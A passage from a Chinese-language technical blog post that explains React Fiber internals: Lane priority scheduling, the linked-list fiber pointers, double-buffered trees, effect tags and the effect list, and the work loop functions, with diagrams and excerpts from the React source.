节点任务队列</li><li>时间切片分配时间：将浏览器每个渲染帧的空闲时间分配给任务队列</li><li>优先级调度介入：允许高优先级任务抢占当前执行</li><li>渐进式提交：完成的部分内容可先提交显示</li></ol><h3 id="基于优先级的任务调度"><a href="#基于优先级的任务调度" class="headerlink" title="基于优先级的任务调度"></a>基于优先级的任务调度</h3><p>React 使用 Lane 模型定义优先级，每个优先级对应一个二进制位</p><p><strong>调度流程</strong></p><p>任务标记阶段：当触发更新时，React 根据场景分配优先级</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">requestUpdateLane</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> (isTransition) <span class="hljs-keyword">return</span> <span class="hljs-title class_">TransitionLane</span>;       <span class="hljs-comment">// useTransition 更新</span><br>  <span class="hljs-keyword">if</span> (isUserBlockingEvent) <span class="hljs-keyword">return</span> <span class="hljs-title class_">InputLane</span>;    <span class="hljs-comment">// 用户交互事件</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">DefaultLane</span>;                          <span class="hljs-comment">// 默认更新</span><br>&#125;<br><br><span class="hljs-comment">// 示例：点击事件触发的更新</span><br>button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> updateLane = <span class="hljs-title function_">getEventPriority</span>(event);   <span class="hljs-comment">// 返回 InputContinuousLane</span><br>  <span class="hljs-title function_">scheduleUpdate</span>(fiber, updateLane);<br>&#125;);<br></code></pre></td></tr></table></figure><p>任务调度阶段：根据优先级和剩余时间控制执行顺序</p><pre class="mermaid">sequenceDiagram    participant Browser as 浏览器    participant Scheduler as React调度器    participant Renderer as 渲染器        Browser->>Scheduler: 新帧开始（16.6ms）    Scheduler->>Renderer: 获取待处理任务    Renderer->>Renderer: 按优先级排序任务    loop 时间切片执行        Renderer->>Renderer: 执行最高优先级任务        Renderer-->>Scheduler: 检查剩余时间        Scheduler->>Browser: 时间用尽则归还控制    end    Browser->>Browser: 执行绘制/用户输入    Browser->>Scheduler: 下一帧继续</pre><p>中断与抢占机制：</p><ul><li>高优先级任务可直接中断正在执行的低优先级任务</li><li>被中断的任务可保存进度到 nextUnitOfWork 指针中，后续恢复</li></ul><p>饥饿问题处理：长时间未执行的低优先级任务会被逐步提升优先级</p><p><strong>关键调度策略</strong></p><ol><li>批量更新合并：比如相同优先级的多个 setState 会被合并</li><li>优先级反转预防：</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ensureRootIsScheduled</span>(<span class="hljs-params">root</span>) &#123;<br>  <span class="hljs-keyword">const</span> nextLanes = <span class="hljs-title function_">getNextLanes</span>(root, root.<span class="hljs-property">pendingLanes</span>);<br>  <span class="hljs-keyword">const</span> highestPriorityLane = <span class="hljs-title function_">getHighestPriorityLane</span>(nextLanes);<br>  <br>  <span class="hljs-comment">// 当前执行中的低优先级任务被高优先级打断</span><br>  <span class="hljs-keyword">if</span> (existingCallbackPriority !== highestPriorityLane) &#123;<br>    <span class="hljs-title function_">cancelCallback</span>(existingCallbackNode); <span class="hljs-comment">// 取消旧任务</span><br>    <span class="hljs-title function_">scheduleNewCallback</span>(highestPriorityLane); <span class="hljs-comment">// 调度新任务</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>时间切片分配：不同优先级的任务获得的时间片不同</li></ol><table><thead><tr><th align="left">优先级</th><th align="left">单次分配时间</th><th align="left">是否可中断</th></tr></thead><tbody><tr><td align="left">SyncLane</td><td align="left">不限</td><td align="left">否</td></tr><tr><td align="left">InputContinuousLane</td><td align="left">5ms</td><td align="left">是（仅限更高优先级）</td></tr><tr><td align="left">DefaultLane</td><td align="left">2ms</td><td align="left">是</td></tr><tr><td align="left">TransitionLane</td><td align="left">1ms</td><td align="left">是</td></tr></tbody></table><h1 id="第三章：Fiber的数据结构与算法实现"><a href="#第三章：Fiber的数据结构与算法实现" class="headerlink" title="第三章：Fiber的数据结构与算法实现"></a>第三章：Fiber的数据结构与算法实现</h1><h2 id="3-1-Fiber节点的详细结构解析"><a href="#3-1-Fiber节点的详细结构解析" class="headerlink" title="3.1 Fiber节点的详细结构解析"></a>3.1 Fiber节点的详细结构解析</h2><h3 id="child、sibling、return指针的链表关系"><a href="#child、sibling、return指针的链表关系" class="headerlink" title="child、sibling、return指针的链表关系"></a>child、sibling、return指针的链表关系</h3><p>Fiber 架构的设计哲学在于将树形结构转化为单向链表+树形回溯的混合结构，在保持父子关系的同时获得链表的高效遍历能力。实现该混合结构的关键点就是 child、sibling、return 这三个指针。</p><p><strong>三个指针的作用与关系</strong></p><table><thead><tr><th align="left">指针名</th><th align="left">指向</th><th align="left">功能描述</th><th align="left">类比传统树结构</th></tr></thead><tbody><tr><td align="left">child</td><td align="left">第一个子节点</td><td align="left">向下遍历的入口</td><td align="left">node.firstChild</td></tr><tr><td align="left">sibling</td><td align="left">下一个兄弟节点</td><td align="left">横向遍历同级节点</td><td align="left">node.nextSibling</td></tr><tr><td align="left">return</td><td align="left">父节点</td><td align="left">完成当前分支后向上回溯</td><td align="left">node.parentNode</td></tr></tbody></table><p><strong>链表结构图解</strong></p><p>假设有如下组件树：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;App&gt;<br>  &lt;Header /&gt;<br>  &lt;Content&gt;<br>    &lt;Sidebar /&gt;<br>    &lt;Main /&gt;<br>  &lt;/Content&gt;<br>&lt;/App&gt;<br></code></pre></td></tr></table></figure><p>那该组件树对应的 Fiber 链表结构如下：</p><pre class="mermaid">graph TD    A[App] -->|child| B[Header]    B -->|sibling| C[Content]    C -->|child| D[Sidebar]    D -->|sibling| E[Main]    E -->|return| C    D -->|return| C    C -->|return| A    B -->|return| A</pre><p>指针关系表如下：</p><table><thead><tr><th align="left">Fiber 节点</th><th align="left">child</th><th align="left">sibling</th><th align="left">return</th></tr></thead><tbody><tr><td align="left">App</td><td align="left">Header</td><td align="left">null</td><td align="left">null</td></tr><tr><td align="left">Header</td><td align="left">null</td><td align="left">Content</td><td align="left">App</td></tr><tr><td align="left">Content</td><td align="left">Sidebar</td><td align="left">null</td><td align="left">App</td></tr><tr><td align="left">Sidebar</td><td align="left">null</td><td align="left">Main</td><td align="left">Content</td></tr><tr><td align="left">Main</td><td align="left">null</td><td align="left">null</td><td align="left">Content</td></tr></tbody></table><h3 id="alternate与双缓存树（Current-WorkInProgress）"><a href="#alternate与双缓存树（Current-WorkInProgress）" class="headerlink" title="alternate与双缓存树（Current&#x2F;WorkInProgress）"></a>alternate与双缓存树（Current&#x2F;WorkInProgress）</h3><p>alternate 指针和双缓存树是实现并发渲染和状态一致性的核心机制</p><p><strong>双缓存树的本质</strong></p><p>基本概念</p><table><thead><tr><th align="left">树类型</th><th align="left">作用</th><th align="left">特点</th></tr></thead><tbody><tr><td align="left">current</td><td align="left">当前界面正在显示内容对应的 Fiber 树</td><td align="left">用户正在交互的稳定版本</td></tr><tr><td align="left">workInProgress</td><td align="left">正在内存中构建的 Fiber 树（即将成为下一针显示内容）</td><td align="left">可中断、可丢弃的中间状态</td></tr></tbody></table><p>alternate 指针的作用：每个 Fiber 节点都有一个 alternate 字段，指向另一棵树上的对应节点（current fiberNodeA.alternate &lt;-&gt; workInProgress fiberNodeA.alternate）</p><p><strong>双缓存树的工作流程</strong></p><p>初始渲染阶段：</p><pre class="mermaid">sequenceDiagram    participant R as React    participant D as DOM        R->>R: 创建 WorkInProgress 树（初始为空）    R->>R: 从 Root 开始构建 Fiber 节点    R->>R: 每个新节点设置 alternate=null    R->>D: 首次渲染完成后，WorkInProgress 树变为 Current 树</pre><p>更新阶段：</p><pre class="mermaid">sequenceDiagram    participant C as Current 树    participant W as WorkInProgress 树    participant R as React 调度器        R->>W: 从 Current 树的 Root 克隆节点    C->>W: 通过 alternate 互相指向    loop 渲染阶段        R->>W: 增量构建/更新节点        W->>C: 通过 alternate 对比差异    end    R->>C: 提交完成后交换两棵树</pre><h3 id="effectTag与副作用链表（Effect-List）"><a href="#effectTag与副作用链表（Effect-List）" class="headerlink" title="effectTag与副作用链表（Effect List）"></a>effectTag与副作用链表（Effect List）</h3><p>在了解 effectTag 之前，我们先了解下什么是 side effects（副作用）。</p><p>在 React 中，副作用是指那些在组件渲染过程中与外部世界交互或影响外部状态的操作（不能在 render 阶段完成）。它们超出了纯函数式渲染的范畴，是 React 组件中需要特殊处理的行为。</p><p><strong>副作用的本质特征</strong></p><table><thead><tr><th align="left">特征</th><th align="left">说明</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">非纯操作</td><td align="left">违反纯函数原则（相同输入 ≠ 相同输出）</td><td align="left">数据获取、DOM 手动操作</td></tr><tr><td align="left">外部依赖</td><td align="left">与 React 渲染流程外的系统交互</td><td align="left">访问浏览器 API、网络请求</td></tr><tr><td align="left">时序敏感性</td><td align="left">执行时机影响结果</td><td align="left">事件监听、定时器</td></tr><tr><td align="left">资源管理</td><td align="left">需要显式清理</td><td align="left">取消订阅、移除事件监听</td></tr></tbody></table><p><strong>副作用分类机制</strong></p><table><thead><tr><th align="left">副作用类型</th><th align="left">处理方式</th><th align="left">对应 Hook</th></tr></thead><tbody><tr><td align="left">同步 DOM 副作用</td><td align="left">布局阶段同步执行</td><td align="left">useLayoutEffect</td></tr><tr><td align="left">异步副作用</td><td align="left">浏览器绘制后执行</td><td align="left">useEffect</td></tr><tr><td align="left">状态更新副作用</td><td align="left">随渲染流程处理</td><td align="left">useState&#x2F;useReducer setter</td></tr><tr><td align="left">回调副作用</td><td align="left">事件处理中执行</td><td align="left">事件处理函数</td></tr></tbody></table><p><strong>正确处理副作用的规则</strong></p><ol><li>副作用隔离原则：避免渲染中执行（不要在 render 函数中或函数式组件主题中直接操作副作用），使用 Hook 封装（比如 useEffect）</li><li>明确声明依赖项（useEffect dependencies）</li><li>副作用清理机制（useEffect return）</li></ol><p>effectTag则是<code>副作用标记系统</code>。</p><p><strong>effectTag 的本质与作用</strong></p><ul><li>二进制位掩码：每个 effectTag 是一个二进制数，表示需要执行的副作用类型</li><li>高效内存管理：通过位运算组合多个标记（如 Placement | Update）</li><li>精确追踪：标记哪些 Fiber 节点需要进行 DOM 操作或其他副作用</li></ul><p><strong>常见的 effectTag 值</strong></p><table><thead><tr><th align="left">标记</th><th align="left">值（二进制）</th><th align="left">对应操作</th></tr></thead><tbody><tr><td align="left">NoEffect</td><td align="left">0b00000000</td><td align="left">无副作用</td></tr><tr><td align="left">Placement</td><td align="left">0b00000010</td><td align="left">插入新节点</td></tr><tr><td align="left">Update</td><td align="left">0b00000100</td><td align="left">更新属性&#x2F;样式</td></tr><tr><td align="left">Deletion</td><td align="left">0b00001000</td><td align="left">删除节点</td></tr><tr><td align="left">Snapshot</td><td align="left">0b00010000</td><td align="left">生命周期 getSnapshotBeforeUpdate</td></tr><tr><td align="left">Passive</td><td align="left">0b00100000</td><td align="left">useEffect 的副作用</td></tr><tr><td align="left">Callback</td><td align="left">0b01000000</td><td align="left">setState 的回调</td></tr></tbody></table><p>副作用链表（effect list）是只包含<code>有副作用的 Fiber 节点</code>的链表结构，它的构建时机是在 <code>completeWork</code> 阶段串联有 effectTag 的节点。它的关键指针如下：</p><ul><li>firstEffect：链表头节点</li><li>nextEffect：下一个待处理节点</li><li>lastEffect：链表尾节点</li></ul><p><strong>副作用链表的构建过程</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">completeWork</span>(<span class="hljs-params">fiber</span>) &#123;<br>  <span class="hljs-comment">// 处理当前节点工作...</span><br>  <br>  <span class="hljs-comment">// 构建 Effect List</span><br>  <span class="hljs-keyword">if</span> (fiber.<span class="hljs-property">effectTag</span> &gt; <span class="hljs-title class_">NoEffect</span>) &#123;<br>    <span class="hljs-keyword">if</span> (fiber.<span class="hljs-property">return</span> !== <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-comment">// 将当前节点添加到父节点的 Effect List</span><br>      <span class="hljs-keyword">if</span> (fiber.<span class="hljs-property">return</span>.<span class="hljs-property">firstEffect</span> === <span class="hljs-literal">null</span>) &#123;<br>        fiber.<span class="hljs-property">return</span>.<span class="hljs-property">firstEffect</span> = fiber;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        fiber.<span class="hljs-property">return</span>.<span class="hljs-property">lastEffect</span>.<span class="hljs-property">nextEffect</span> = fiber;<br>      &#125;<br>      fiber.<span class="hljs-property">return</span>.<span class="hljs-property">lastEffect</span> = fiber;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>effectTag&#x2F;副作用链表的工作原理</strong></p><ol><li>标记阶段：在 beginWork 中标记需要执行的 DOM 操作</li><li>链表构建：在 completeWork 阶段串联具有 effectTag 的节点</li><li>提交阶段：按链表顺序执行 DOM 操作</li></ol><h2 id="3-2-深度优先遍历的迭代实现"><a href="#3-2-深度优先遍历的迭代实现" class="headerlink" title="3.2 深度优先遍历的迭代实现"></a>3.2 深度优先遍历的迭代实现</h2><h3 id="递归遍历的问题与链表遍历的优势"><a href="#递归遍历的问题与链表遍历的优势" class="headerlink" title="递归遍历的问题与链表遍历的优势"></a>递归遍历的问题与链表遍历的优势</h3><p>在 React15 及之前版本的 stack reconciler 协调器采用的遍历策略是递归遍历</p><p><strong>递归遍历的问题</strong></p><ol><li>无条件全量遍历：从根节点开始递归处理每一个节点，无论节点状态是否变化</li><li>不可中断：依赖于 JavaScript 栈调用，一旦开始就必须执行到底，中途无法中断或跳过子节点</li><li>性能缺陷：阻塞主线程、无优先级调度</li></ol><p><strong>链表遍历的优势</strong></p><ol><li>可中断&#x2F;恢复：通过全局变量（nextUnitOfWork）保存进度，结合 requestIdleCallback 或 messageChannel 时间切片实现中断和恢复。</li><li>按需遍历：通过 lanes 和 childLanes 标记 Fiber 节点优先级，跳过无需更新的子树，时间复杂度从递归的 O(n) 优化到 O(m)</li><li>优先级调度：结合 Lane 模型动态调整遍历顺序，实现高优先级任务中断低优先级任务</li><li>内存安全：链表遍历在堆内存中进行，不受调用栈限制，没有递归栈帧累积，因此支持任意深度的组件树</li></ol><h3 id="performUnitOfWork源码解析（含配图）"><a href="#performUnitOfWork源码解析（含配图）" class="headerlink" title="performUnitOfWork源码解析（含配图）"></a>performUnitOfWork源码解析（含配图）</h3><p>我们首先了解下 Fiber 架构中的工作循环：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">/** <span class="hljs-doctag">@noinline</span> */</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">workLoopConcurrentByScheduler</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// Perform work until Scheduler asks us to yield</span><br>  <span class="hljs-keyword">while</span> (workInProgress !== <span class="hljs-literal">null</span> &amp;&amp; !<span class="hljs-title function_">shouldYield</span>()) &#123;<br>    <span class="hljs-comment">// $FlowFixMe[incompatible-call] flow doesn&#x27;t know that shouldYield() is side-effect free</span><br>    <span class="hljs-title function_">performUnitOfWork</span>(workInProgress);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>performUnitOfWork 是 Fiber 架构中工作循环（<code>workLoop</code>）的最小执行单元，源码位置见<a href="https://github.com/facebook/react/blob/main/packages/react-reconciler/src/ReactFiberWorkLoop.js#L2779">这里</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">performUnitOfWork</span>(<span class="hljs-params">unitOfWork: Fiber</span>): <span class="hljs-keyword">void</span> &#123;<br>  <span class="hljs-comment">// The current, flushed, state of this fiber is the alternate. Ideally</span><br>  <span class="hljs-comment">// nothing should rely on this, but relying on it here means that we don&#x27;t</span><br>  <span class="hljs-comment">// need an additional field on the work in progress.</span><br>  <span class="hljs-keyword">const</span> current = unitOfWork.<span class="hljs-property">alternate</span>;<br><br>  <span class="hljs-keyword">let</span> next;<br>  <span class="hljs-keyword">if</span> (enableProfilerTimer &amp;&amp; (unitOfWork.<span class="hljs-property">mode</span> &amp; <span class="hljs-title class_">ProfileMode</span>) !== <span class="hljs-title class_">NoMode</span>) &#123;<br>    <span class="hljs-title function_">startProfilerTimer</span>(unitOfWork);<br>    <span class="hljs-keyword">if</span> (__DEV__) &#123;<br>      next = <span class="hljs-title function_">runWithFiberInDEV</span>(<br>        unitOfWork,<br>        beginWork,<br>        current,<br>        unitOfWork,<br>        entangledRenderLanes,<br>      );<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      next = <span class="hljs-title function_">beginWork</span>(current, unitOfWork, entangledRenderLanes);<br>    &#125;<br>    <span class="hljs-title function_">stopProfilerTimerIfRunningAndRecordDuration</span>(unitOfWork);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> (__DEV__) &#123;<br>      next = <span class="hljs-title function_">runWithFiberInDEV</span>(<br>        unitOfWork,<br>        beginWork,<br>        current,<br>        unitOfWork,<br>        entangledRenderLanes,<br>      );<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      next = <span class="hljs-title function_">beginWork</span>(current, unitOfWork, entangledRenderLanes);<br>    &#125;<br>  &#125;<br><br>  unitOfWork.<span class="hljs-property">memoizedProps</span> = unitOfWork.<span class="hljs-property">pendingProps</span>;<br>  <span class="hljs-keyword">if</span> (next === <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-comment">// If this doesn&#x27;t spawn new work, complete the current work.</span><br>    <span class="hljs-title function_">completeUnitOfWork</span>(unitOfWork);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    workInProgress = next;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其核心代码如下，主要流程分为两个阶段：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">performUnitOfWork</span>(<span class="hljs-params">unitOfWork: Fiber</span>): <span class="hljs-keyword">void</span> &#123;<br>  <span class="hljs-comment">// 1. 开始工作阶段（递）</span><br>  <span class="hljs-keyword">const</span> current = unitOfWork.<span class="hljs-property">alternate</span>;<br>  <span class="hljs-keyword">let</span> next;<br>  next = <span class="hljs-title function_">beginWork</span>(current, unitOfWork, entangledRenderLanes);<br><br>  <span class="hljs-comment">// 2. 完成工作阶段（归）</span><br>  <span class="hljs-keyword">if</span> (next === <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-title function_">completeUnitOfWork</span>(unitOfWork);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    workInProgress = next;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>beginWork - 递阶段：处理组件更新（props&#x2F;state 计算、diff 等）</strong></p><p>核心代码逻辑：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">beginWork</span>(<span class="hljs-params"></span><br><span class="hljs-params">  current: Fiber | <span class="hljs-literal">null</span>,</span><br><span class="hljs-params">  workInProgress: Fiber,</span><br><span class="hljs-params">  renderLanes: Lanes</span><br><span class="hljs-params"></span>): <span class="hljs-title class_">Fiber</span> | <span class="hljs-literal">null</span> &#123;<br>  <span class="hljs-comment">// 检查是否需要跳过更新（优化手段）</span><br>  <span class="hljs-keyword">if</span> (current !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">const</span> oldProps = current.<span class="hljs-property">memoizedProps</span>;<br>    <span class="hljs-keyword">const</span> newProps = workInProgress.<span class="hljs-property">pendingProps</span>;<br>    <br>    <span class="hljs-keyword">if</span> (oldProps === newProps &amp;&amp; !<span class="hljs-title function_">hasLegacyContextChanged</span>()) &#123;<br>      <span class="hljs-keyword">const</span> hasScheduledUpdateOrContext = <span class="hljs-title function_">checkScheduledUpdateOrContext</span>(<br>        current,<br>        renderLanes,<br>      );<br>      <span class="hljs-keyword">if</span> (<br>        !hasScheduledUpdateOrContext &amp;&amp;<br>        <span class="hljs-comment">// If this is the second pass of an error or suspense boundary, there</span><br>        <span class="hljs-comment">// may not be work scheduled on `current`, so we check for this flag.</span><br>        (workInProgress.<span class="hljs-property">flags</span> &amp; <span class="hljs-title class_">DidCapture</span>) === <span class="hljs-title class_">NoFlags</span><br>      ) &#123;<br>        <span class="hljs-comment">// No pending updates or context. Bail out now.</span><br>        didReceiveUpdate = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">attemptEarlyBailoutIfNoScheduledUpdate</span>(<br>          current,<br>          workInProgress,<br>          renderLanes,<br>        );<br>      &#125;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-comment">// 根据组件类型执行不同处理</span><br>  <span class="hljs-keyword">switch</span> (workInProgress.<span class="hljs-property">tag</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">FunctionComponent</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-title function_">updateFunctionComponent</span>(current, workInProgress, ...);<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">ClassComponent</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-title function_">updateClassComponent</span>(current, workInProgress, ...);<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">HostComponent</span>: <span class="hljs-comment">// DOM 节点</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-title function_">updateHostComponent</span>(current, workInProgress, ...);<br>    <span class="hljs-keyword">case</span> <span class="hljs-title class_">ScopeComponent</span>: &#123;<br>      <span class="hljs-keyword">if</span> (enableScopeAPI) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">updateScopeComponent</span>(current, workInProgress, renderLanes);<br>      &#125;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-comment">// ...其他类型处理</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>核心操作：</p><ul><li>优先级过滤：通过 renderLanes 跳过低优先级任务</li><li>diff 算法：在<code>reconcileChildren</code>中生成子 Fiber</li><li>副作用标记：设置 effectTag</li></ul><p><strong>completeUnitOfWork - 归阶段：完成 DOM 准备、收集副作用</strong></p><p>核心代码逻辑：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">completeUnitOfWork</span>(<span class="hljs-params">unitOfWork: Fiber</span>): <span class="hljs-keyword">void</span> &#123;<br>  <span class="hljs-comment">// Attempt to complete the current unit of work, then move to the next</span><br>  <span class="hljs-comment">// sibling. If there are no more siblings, return to the parent fiber.</span><br>  <span class="hljs-keyword">let</span> <span class="hljs-attr">completedWork</span>: <span class="hljs-title class_">Fiber</span> = unitOfWork;<br>  <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-keyword">if</span> ((completedWork.<span class="hljs-property">flags</span> &amp; <span class="hljs-title class_">Incomplete</span>) !== <span class="hljs-title class_">NoFlags</span>) &#123;<br>      <span class="hljs-comment">// This fiber did not complete, because one of its children did not</span><br>      <span class="hljs-comment">// complete. Switch to unwinding the stack instead of completing it.</span><br>      <span class="hljs-comment">//</span><br>      <span class="hljs-comment">// The reason &quot;unwind&quot; and &quot;complete&quot; is interleaved is because when</span><br>      <span class="hljs-comment">// something suspends, we continue rendering the siblings even though</span><br>      <span class="hljs-comment">// they will be replaced by a fallback.</span><br>      <span class="hljs-keyword">const</span> skipSiblings = workInProgressRootDidSkipSuspendedSiblings;<br>      <span class="hljs-title function_">unwindUnitOfWork</span>(completedWork, skipSiblings);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// The current, flushed, state of this fiber is the alternate. Ideally</span><br>    <span class="hljs-comment">// nothing should rely on this, but relying on it here means that we don&#x27;t</span><br>    <span class="hljs-comment">// need an additional field on the work in progress.</span><br>    <span class="hljs-keyword">const</span> current = completedWork.<span class="hljs-property">alternate</span>;<br>    <span class="hljs-keyword">const</span> returnFiber = completedWork.<span class="hljs-property">return</span>;<br><br>    <span class="hljs-keyword">let</span> next;<br>    <span class="hljs-title function_">startProfilerTimer</span>(completedWork);<br>    <span class="hljs-keyword">if</span> (__DEV__) &#123;<br>      next = <span class="hljs-title function_">runWithFiberInDEV</span>(<br>        completedWork,<br>        completeWork,<br>        current,<br>        completedWork,<br>        entangledRenderLanes,<br>      );<br>    